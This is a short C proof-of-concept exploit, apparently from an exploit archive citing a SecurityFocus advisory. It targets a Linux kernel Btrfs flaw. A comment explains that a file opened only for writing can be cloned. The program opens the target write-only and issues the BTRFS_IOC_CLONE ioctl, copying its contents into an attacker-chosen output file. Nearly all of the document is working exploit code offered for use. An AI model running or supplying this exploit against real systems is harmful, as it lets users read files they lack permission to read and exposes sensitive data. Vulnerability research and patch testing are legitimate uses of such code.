/*
source: http://www.securityfocus.com/bid/40241/info

The Linux Kernel is prone to a security-bypass vulnerability that affects the Btrfs filesystem implementation.

An attacker can exploit this issue to clone a file only open for writing. This may allow attackers to obtain sensitive data or launch further attacks. 
*/

#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>

#define BTRFS_IOC_CLONE _IOW(0x94, 9, int)

int main(int argc, char * argv[])
{

  if(argc < 3) {
    printf("Usage: %s [target] [output]\n", argv[0]);
    exit(-1);
  }

  int output = open(argv[2], O_WRONLY | O_CREAT, 0644);

  /* Note - opened for writing, not reading */
  int target = open(argv[1], O_WRONLY);

  ioctl(output, BTRFS_IOC_CLONE, target);

}
